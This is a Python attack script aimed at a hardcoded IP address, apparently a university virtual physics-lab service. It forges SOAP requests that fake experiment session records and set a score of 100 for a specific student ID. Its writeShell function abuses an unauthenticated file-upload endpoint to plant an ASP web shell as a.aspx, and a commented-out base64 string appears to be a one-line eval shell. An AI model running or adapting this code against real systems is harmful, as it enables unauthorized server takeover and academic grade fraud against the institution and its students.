#!  /usr/bin/env python3
# coding=utf-8

import re
import requests
import base64
from bs4 import BeautifulSoup


def info(dataType, data):
    print('\033[036m[+]{0}\033[0m: \033[035m{1}\033[0m'.format(dataType, data))
    return data


def initFirst(userId, labId):
    url = "http://118.184.217.73:7182/BizService.svc"
    headers = {"Content-Type": "text/xml; charset=utf-8",
               "SOAPAction": "http://www.ustcori.com/2009/10/IBizService/DoService",
               }
    body = '''<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
              <s:Body><DoService xmlns="http://www.ustcori.com/2009/10">
              <request xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
              <BizCode>UstcOri.BLL.BLLUserCountControl</BizCode>
              <EnableCache>false</EnableCache>
              <MethodName>ucControlMethod</MethodName>
              <Parameters xmlns:a="http://schemas.microsoft.com/2003/10/Serialization/Arrays">
              <a:KeyValueOfstringanyType><a:Key>ucControl</a:Key>
              <a:Value i:type="b:string" xmlns:b="http://www.w3.org/2001/XMLSchema">{"ID":0,"LabID":''' + str(
        labId) + ''',"UserID":"''' + str(
        userId) + '''","ServiceID":"开始实验","StartTime":"\/Date(-62135596800000+0800)\/","OperType":0,"ServiceFlag":false,"ServiceNumber":0,"MaxFileTime":0}</a:Value></a:KeyValueOfstringanyType></Parameters></request></DoService></s:Body></s:Envelope>'''

    resp = requests.post(url=url, headers=headers, data=body.encode('utf-8'))

    contain = resp.content.decode()
    id = re.findall("DataString>(\d{4})", contain)[0]
    info("id", id)
    return id


def initSecond(userId, labId):
    url = "http://118.184.217.73:7182/BizService.svc"
    headers = {"Content-Type": "text/xml; charset=utf-8",
               "SOAPAction": "http://www.ustcori.com/2009/10/IBizService/DoService", }

    body = '''
    <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
    <s:Body><DoService xmlns="http://www.ustcori.com/2009/10">
    <request xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
    <BizCode>UstcOri.BLL.BLLLabClent</BizCode>
    <EnableCache>false</EnableCache><MethodName>SetLabTimeRecord</MethodName>
    <Parameters xmlns:a="http://schemas.microsoft.com/2003/10/Serialization/Arrays">
    <a:KeyValueOfstringanyType><a:Key>labTime</a:Key>
    <a:Value i:type="b:string" xmlns:b="http://www.w3.org/2001/XMLSchema">{"ID":0,"USERID":"''' + str(
        userId) + '''","LABID":''' + str(
        labId) + ''',"STARTTIME":"\/Date(-62135596800000+0800)\/","ENDTIME":"\/Date(-62135596800000+0800)\/","Mark":"1","LabDateUrl":null,"Score":0}</a:Value></a:KeyValueOfstringanyType></Parameters></request></DoService></s:Body></s:Envelope>'''

    resp = requests.post(url=url, headers=headers, data=body.encode('utf-8'))

    contain = resp.content.decode()
    id = re.findall("DataString>(\d{4})", contain)[0]
    info("id", id)
    return id


def initThird(userId):
    url = "http://118.184.217.73:7182/BizService.svc"
    headers = {"Content-Type": "text/xml; charset=utf-8",
               "SOAPAction": "http://www.ustcori.com/2009/10/IBizService/DoService"}

    body = '''
    <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
    <s:Body><DoService xmlns="http://www.ustcori.com/2009/10">
    <request xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
    <BizCode>UstcOri.BLL.BLLLabClent</BizCode><EnableCache>false</EnableCache><MethodName>JFIsAccess</MethodName>
    <Parameters xmlns:a="http://schemas.microsoft.com/2003/10/Serialization/Arrays">
    <a:KeyValueOfstringanyType><a:Key>UserID</a:Key>
    <a:Value i:type="b:string" xmlns:b="http://www.w3.org/2001/XMLSchema">"''' + str(userId) + '''"</a:Value></a:KeyValueOfstringanyType><a:KeyValueOfstringanyType><a:Key>LabName</a:Key><a:Value i:type="b:string" xmlns:b="http://www.w3.org/2001/XMLSchema">"02-光栅单色仪实验"</a:Value></a:KeyValueOfstringanyType><a:KeyValueOfstringanyType><a:Key>SysID</a:Key><a:Value i:type="b:string" xmlns:b="http://www.w3.org/2001/XMLSchema">1</a:Value></a:KeyValueOfstringanyType></Parameters></request></DoService></s:Body></s:Envelope>
    '''

    resp = requests.post(url=url, headers=headers, data=body.encode('utf-8'))

    contain = resp.content.decode()
    status = re.findall("<Status>(\w{7})", contain)[0]
    info("status", status)
    if status == "Success":
        return True
    else:
        return False


def sendFile(userId, fileName):
    url = "http://118.184.217.73:7182/FileTransfer.svc"
    headers = {"Content-Type": "text/xml; charset=utf-8",
               "SOAPAction": "http://tempuri.org/IFileTransfer/UploadFile"}

    with open(fileName, "r") as f:
        answer = f.read()
        f.close()

    body = '''<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
    <s:Body><UploadFile xmlns="http://tempuri.org/">
    <fileName>''' + str(userId) + '''_2020421224510.xml</fileName><path>Upload\LabDate\\02-光栅单色仪实验</path>'''
    body += "<content>" + answer + "</content>" + "<append>false</append></UploadFile></s:Body></s:Envelope>"
    resp = requests.post(url=url, headers=headers, data=body.encode('utf-8'))

    contain = resp.content.decode()
    if len(contain) == 143:
        return True
    else:
        return False


def setScore(userId, id, score, labId):
    url = "http://118.184.217.73:7182/BizService.svc"
    headers = {"Content-Type": "text/xml; charset=utf-8",
               "SOAPAction": "http://www.ustcori.com/2009/10/IBizService/DoService"}
    body = '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><DoService xmlns="http://www.ustcori.com/2009/10"><request xmlns:i="http://www.w3.org/2001/XMLSchema-instance"><BizCode>UstcOri.BLL.BLLLabClent</BizCode><EnableCache>false</EnableCache><MethodName>SetLabTimeRecord</MethodName><Parameters xmlns:a="http://schemas.microsoft.com/2003/10/Serialization/Arrays"><a:KeyValueOfstringanyType><a:Key>labTime</a:Key><a:Value i:type="b:string" xmlns:b="http://www.w3.org/2001/XMLSchema">{"ID":' + str(
        id) + ',"USERID":"' + str(
        userId) + '","LABID":' + str(
        labId) + ',"STARTTIME":"\/Date(-62135596800000+0800)\/","ENDTIME":"\/Date(-62135596800000+0800)\/","Mark":"2","LabDateUrl":"Upload\\\\LabDate\\\\02-光栅单色仪实验\\\\' + str(
        userId) + '_2020421224510.xml","Score":' + str(
        score) + '}</a:Value></a:KeyValueOfstringanyType></Parameters></request></DoService></s:Body></s:Envelope>'
    resp = requests.post(url=url, headers=headers, data=body.encode('utf-8'))

    contain = resp.content.decode()
    status = re.findall("<Status>(\w{7})", contain)[0]
    info("status", status)
    if status == "Success":
        return True
    else:
        return False


def flushState(id):
    url = "http://118.184.217.73:7182/BizService.svc"
    headers = {"Content-Type": "text/xml; charset=utf-8",
               "SOAPAction": "http://www.ustcori.com/2009/10/IBizService/DoService"}
    body = '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><DoService xmlns="http://www.ustcori.com/2009/10"><request xmlns:i="http://www.w3.org/2001/XMLSchema-instance"><BizCode>UstcOri.BLL.BLLUserCountControl</BizCode><EnableCache>false</EnableCache><MethodName>ucControlMethod</MethodName><Parameters xmlns:a="http://schemas.microsoft.com/2003/10/Serialization/Arrays"><a:KeyValueOfstringanyType><a:Key>ucControl</a:Key><a:Value i:type="b:string" xmlns:b="http://www.w3.org/2001/XMLSchema">{"ID":' + str(
        id) + ',"LabID":0,"UserID":null,"ServiceID":null,"StartTime":"\/Date(-62135596800000+0800)\/","OperType":1,"ServiceFlag":false,"ServiceNumber":0,"MaxFileTime":0}</a:Value></a:KeyValueOfstringanyType></Parameters></request></DoService></s:Body></s:Envelope>'
    resp = requests.post(url=url, headers=headers, data=body.encode('utf-8'))

    contain = resp.content.decode()
    status = re.findall("<Status>(\w{7})", contain)[0]
    info("status", status)
    if status == "Success":
        return True
    else:
        return False


def writeShell():
    url = "http://118.184.217.73:7182/FileTransfer.svc"
    headers = {"Content-Type": "text/xml; charset=utf-8",
               "SOAPAction": "http://tempuri.org/IFileTransfer/UploadFile"}

    with open("./shell.asp", "r") as f:
        shell = f.read()
        f.close()
    # payload = base64.b16encode(shell.encode())
    # f = "PCVldmFsIHJlcXVlc3QoImNob3BwZXIiKSU+"
    f = shell
    info("answer", f)
    body = '''<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
        <s:Body><UploadFile xmlns="http://tempuri.org/">
        <fileName>a.aspx</fileName><path>Upload\LabDate\\03-单缝衍射</path>'''
    body += "<content>" + f + "</content>" + "<append>false</append></UploadFile></s:Body></s:Envelope>"
    resp = requests.post(url=url, headers=headers, data=body.encode('utf-8'))

    contain = resp.content.decode()
    # if len(contain) == 143:
    #     return True
    # else:
    #     return False
    info("contain", contain)


def main():
    writeShell()
    exit()
    labId = 393
    userId = 41824142
    fileName = "./lab2.txt"
    id1 = initFirst(userId, labId)
    id2 = initSecond(userId, labId)
    status = initThird(userId)
    serilizeStatus = sendFile(userId, fileName)
    setScoreStatus = setScore(userId, id2, 100, labId)
    flushStatus = flushState(id1)


if __name__ == "__main__":
    main()
